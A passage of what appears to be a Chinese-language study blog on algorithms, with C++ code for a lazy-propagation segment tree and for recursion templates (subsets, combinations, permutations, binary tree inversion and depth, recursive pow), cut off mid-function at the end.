class="hljs-type">int</span>&gt;&amp; a)</span> &#123; <span class="hljs-comment">// 建树</span><br>        <span class="hljs-keyword">if</span> (l == r) tr[u] = a[l];<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> m = (l + r) / <span class="hljs-number">2</span>;<br>            build(<span class="hljs-number">2</span> * u, l, m, a);<br>            build(<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>, m + <span class="hljs-number">1</span>, r, a);<br>            tr[u] = tr[<span class="hljs-number">2</span> * u] + tr[<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">upd</span><span class="hljs-params">(<span class="hljs-type">int</span> ul, <span class="hljs-type">int</span> ur, <span class="hljs-type">int</span> val)</span> &#123; upd(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, ul, ur, val); &#125; <span class="hljs-comment">// 更新区间 [ul, ur]</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">upd</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> ul, <span class="hljs-type">int</span> ur, <span class="hljs-type">int</span> val)</span> &#123;<br>        <span class="hljs-keyword">if</span> (ul &lt;= l &amp;&amp; r &lt;= ur) apply(u, l, r, val);<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> m = (l + r) / <span class="hljs-number">2</span>;<br>            push(u, l, m, r);<br>            <span class="hljs-keyword">if</span> (ul &lt;= m) upd(<span class="hljs-number">2</span> * u, l, m, ul, ur, val);<br>            <span class="hljs-keyword">if</span> (ur &gt; m) upd(<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>, m + <span class="hljs-number">1</span>, r, ul, ur, val);<br>            tr[u] = tr[<span class="hljs-number">2</span> * u] + tr[<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> <span class="hljs-title function_">qry</span><span class="hljs-params">(<span class="hljs-type">int</span> ql, <span class="hljs-type">int</span> qr)</span> &#123; <span class="hljs-keyword">return</span> qry(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, ql, qr); &#125; <span class="hljs-comment">// 查询区间 [ql, qr] 的和</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">qry</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> ql, <span class="hljs-type">int</span> qr)</span> &#123;<br>        <span class="hljs-keyword">if</span> (ql &lt;= l &amp;&amp; r &lt;= qr) <span class="hljs-keyword">return</span> tr[u];<br>        <span class="hljs-type">int</span> m = (l + r) / <span class="hljs-number">2</span>;<br>        push(u, l, m, r);<br>        <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ql &lt;= m) res += qry(<span class="hljs-number">2</span> * u, l, m, ql, qr);<br>        <span class="hljs-keyword">if</span> (qr &gt; m) res += qry(<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>, m + <span class="hljs-number">1</span>, r, ql, qr);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, q;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; q;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">a</span><span class="hljs-params">(n)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <span class="hljs-built_in">cin</span> &gt;&gt; a[i];<br>    SegmentTree <span class="hljs-title function_">st</span><span class="hljs-params">(n)</span>;<br>    st.build(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, a);<br>    <br>    <span class="hljs-keyword">while</span> (q--) &#123;<br>        <span class="hljs-type">int</span> op;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; op;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 操作 1: 区间更新</span><br>            <span class="hljs-type">int</span> l, r, d;<br>            <span class="hljs-built_in">cin</span> &gt;&gt; l &gt;&gt; r &gt;&gt; d;<br>            st.upd(l, r, d);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// 操作 2: 查询区间和</span><br>            <span class="hljs-type">int</span> l, r;<br>            <span class="hljs-built_in">cin</span> &gt;&gt; l &gt;&gt; r;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; st.qry(l, r) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="十四-递归"><a href="#十四-递归" class="headerlink" title="十四.递归"></a>十四.递归</h2><p>汉罗塔问题</p><p>只要将主过程想好，也就是</p><p>一.12从左到中   二.3从左到右   三.12从中到右    如果是n个数呢，就简化为1——n-1从左到中，n从左到右，1——n-1从中到右就如此简化下去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">f（x）&#123;<br>    <span class="hljs-type">int</span> x;      <span class="hljs-comment">//这里是局部变量，还会再开一次int x。所以就是由每个f各自都有一f(n-1) 份儿  ，所以这些就是如果说非局部的变量。  你不能说某一次f把它改了之后算别的f的时候诶, 它们需要注意保护跟还原这                                                      </span><br>&#125;                                                                                            <br></code></pre></td></tr></table></figure><p>基本框架：</p><ul><li>设计一个黑盒,即这个函数解决的问题,这些代码在当前进程的操作,调用函数相当于开了一个新进程（树）,数学上就像数列f（x），每一个小块即fx都要做什么</li><li>定义递归的边界</li><li>保护还原现场</li></ul><h3 id="三个模版"><a href="#三个模版" class="headerlink" title="三个模版"></a>三个模版</h3><h4 id="子集问题"><a href="#子集问题" class="headerlink" title="子集问题"></a>子集问题</h4><p>给定一个数组 <code>nums</code>，要求生成所有的子集。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n;<br>vector&lt;<span class="hljs-type">int</span>&gt; chosen;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (i == n) &#123; <span class="hljs-comment">// 递归终止条件</span><br>        ans.<span class="hljs-built_in">push_back</span>(chosen);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 递归不选当前元素</span><br>    <span class="hljs-built_in">recur</span>(nums, i + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 递归选择当前元素</span><br>    chosen.<span class="hljs-built_in">push_back</span>(nums[i]);<br>    <span class="hljs-built_in">recur</span>(nums, i + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 撤销选择，还原现场，这里的chosen属于非局部变量</span><br>    chosen.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">subsets</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>    n = nums.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-built_in">recur</span>(nums, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> m;<br>    cin &gt;&gt; m;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nums</span><span class="hljs-params">(m)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) cin &gt;&gt; nums[i];<br>    <br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result = <span class="hljs-built_in">subsets</span>(nums);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; subset : result) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : subset) cout &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        cout &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><hr><h4 id="组合问题："><a href="#组合问题：" class="headerlink" title="组合问题："></a>组合问题：</h4><p>给定整数 <code>n</code> 和 <code>k</code>，从 <code>[1, 2, ..., n]</code> 中选择 <code>k</code> 个数的所有组合。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n, k;<br>vector&lt;<span class="hljs-type">int</span>&gt; chosen;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-comment">// 剪枝条件</span><br>    <span class="hljs-keyword">if</span> (chosen.<span class="hljs-built_in">size</span>() + (n - i + <span class="hljs-number">1</span>) &lt; k) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 递归终止条件</span><br>    <span class="hljs-keyword">if</span> (i == n + <span class="hljs-number">1</span>) &#123;<br>        ans.<span class="hljs-built_in">push_back</span>(chosen);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 不选当前元素</span><br>    <span class="hljs-built_in">recur</span>(i + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 选择当前元素</span><br>    chosen.<span class="hljs-built_in">push_back</span>(i);<br>    <span class="hljs-built_in">recur</span>(i + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 撤销选择</span><br>    chosen.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">combine</span>(<span class="hljs-type">int</span> _n, <span class="hljs-type">int</span> _k) &#123;<br>    n = _n;<br>    k = _k;<br>    ans.<span class="hljs-built_in">clear</span>();<br>    chosen.<span class="hljs-built_in">clear</span>();<br>    <span class="hljs-built_in">recur</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n, k;<br>    cin &gt;&gt; n &gt;&gt; k;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result = <span class="hljs-built_in">combine</span>(n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; combination : result) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : combination) cout &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        cout &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="全排列问题："><a href="#全排列问题：" class="headerlink" title="全排列问题："></a><strong>全排列问题</strong>：</h4><p>给定一个不包含重复数字的数组 <code>nums</code>，要求生成所有可能的全排列。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n;<br>vector&lt;<span class="hljs-type">bool</span>&gt; used;<br>vector&lt;<span class="hljs-type">int</span>&gt; a;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> pos)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pos == n) &#123;<br>        ans.<span class="hljs-built_in">push_back</span>(a);  <span class="hljs-comment">// 找到一个排列</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (!used[i]) &#123; <span class="hljs-comment">// 过滤已使用的元素</span><br>            a.<span class="hljs-built_in">push_back</span>(nums[i]);<br>            used[i] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 标记为使用</span><br>            <span class="hljs-built_in">recur</span>(nums, pos + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 递归下一层</span><br>            used[i] = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 还原状态</span><br>            a.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">permute</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>    n = nums.<span class="hljs-built_in">size</span>();<br>    used = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;(n, <span class="hljs-literal">false</span>);<br>    a.<span class="hljs-built_in">clear</span>();<br>    ans.<span class="hljs-built_in">clear</span>();<br>    <span class="hljs-built_in">recur</span>(nums, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nums</span><span class="hljs-params">(n)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) cin &gt;&gt; nums[i];<br>    <br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result = <span class="hljs-built_in">permute</span>(nums);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; permutation : result) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : permutation) cout &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        cout &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>以上三个问题都是递归实现的“暴力搜索”(或者叫枚举、回溯等)可以总结为以下三种基本形式<br>递归形式<br>指数型排列型组合型<br>时间复杂度规模:knn!n!&#x2F;m!(n-m)!<br>子集、大体积背包全排列、旅行商、N 皇后找顺序的题目组合选数</p><h3 id="例题-5"><a href="#例题-5" class="headerlink" title="例题"></a>例题</h3><h4 id="反转二叉树："><a href="#反转二叉树：" class="headerlink" title="反转二叉树："></a><strong>反转二叉树</strong>：</h4><p>该问题要求对一个二叉树进行左右子树的交换。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// 空节点返回</span><br>    TreeNode* temp = root-&gt;left;  <span class="hljs-comment">// 交换左右子树</span><br>    root-&gt;left = root-&gt;right;<br>    root-&gt;right = temp;<br>    <span class="hljs-built_in">invertTree</span>(root-&gt;left);  <span class="hljs-comment">// 递归反转左子树</span><br>    <span class="hljs-built_in">invertTree</span>(root-&gt;right);  <span class="hljs-comment">// 递归反转右子树</span><br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="翻转一棵二叉树"><a href="#翻转一棵二叉树" class="headerlink" title="翻转一棵二叉树"></a>翻转一棵二叉树</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 定义二叉树节点结构体</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> &#123;<br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br><br>    <span class="hljs-comment">// 构造函数：初始化节点</span><br>    <span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">left</span>(<span class="hljs-literal">NULL</span>), <span class="hljs-built_in">right</span>(<span class="hljs-literal">NULL</span>) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 翻转二叉树的递归函数</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// 基础条件：节点为空时直接返回</span><br><br>        <span class="hljs-comment">// 交换左右子树</span><br>        TreeNode* temp = root-&gt;left;<br>        root-&gt;left = root-&gt;right;<br>        root-&gt;right = temp;<br><br>        <span class="hljs-comment">// 递归处理左右子树</span><br>        <span class="hljs-built_in">invertTree</span>(root-&gt;left);<br>        <span class="hljs-built_in">invertTree</span>(root-&gt;right);<br><br>        <span class="hljs-keyword">return</span> root;  <span class="hljs-comment">// 返回翻转后的根节点</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">// 辅助函数：先序遍历输出二叉树的节点值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preOrder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    cout &lt;&lt; root-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-built_in">preOrder</span>(root-&gt;left);<br>    <span class="hljs-built_in">preOrder</span>(root-&gt;right);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="二叉树的最大深度"><a href="#二叉树的最大深度" class="headerlink" title="二叉树的最大深度"></a>二叉树的最大深度</h4><p>思路一 (自底向上统计信息，分治思想) 最大深度 &#x3D;max(左子树最大深度，右子树最大深度)+1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 递归计算二叉树的最大深度</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果节点为空，深度为0</span><br>        <span class="hljs-comment">// 递归计算左右子树的深度，并返回较大的深度加1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">maxDepth</span>(root-&gt;left), <span class="hljs-built_in">maxDepth</span>(root-&gt;right)) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>思路二(自顶向下维护信息)<br>把“深度”作为一个全局变量–一个跟随结点移动而动态变化的信息递归一层，变量+1，在叶子处更新答案这种写法需要注意保护和还原现场</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Solution</span>() : <span class="hljs-built_in">depth</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">ans</span>(<span class="hljs-number">0</span>) &#123;&#125;  <span class="hljs-comment">// 构造函数初始化</span><br>    <span class="hljs-comment">// 计算二叉树最大深度的主函数</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">calc</span>(root);  <span class="hljs-comment">// 调用递归函数</span><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> depth;  <span class="hljs-comment">// 当前递归深度</span><br>    <span class="hljs-type">int</span> ans;    <span class="hljs-comment">// 存储最大深度</span><br><br>    <span class="hljs-comment">// 递归计算深度的函数</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">calc</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// 空节点返回</span><br>        <span class="hljs-comment">// 更新最大深度</span><br>        ans = <span class="hljs-built_in">max</span>(ans, depth + <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 深度增加，递归遍历左子树和右子树</span><br>        depth++;<br>        <span class="hljs-built_in">calc</span>(root-&gt;left);<br>        <span class="hljs-built_in">calc</span>(root-&gt;right);<br>        <span class="hljs-comment">// 回溯时减少深度</span><br>        depth--;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="递归实现-pow-x-n-问题："><a href="#递归实现-pow-x-n-问题：" class="headerlink" title="递归实现 pow(x, n) 问题："></a><strong>递归实现 <code>pow(x, n)</code> 问题</strong>：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">myPow</span><span class="hljs-params">(<span class="hljs-type">double</span> x, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 任何数的 0 次方都等于 1</span><br>    <span class="hljs-keyword">if</span> (n == INT_MIN) <span class="hljs-keyword">return</span> <span class="hljs-number">1.0</span> / (<span class="hljs-built_in">myPow</span>(x, -(n<span class="hljs-number">+1</span>)) * x);  <span class="hljs-comment">// 处理 n 为最小负数的特殊情况</span><br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1.0</span> / <span 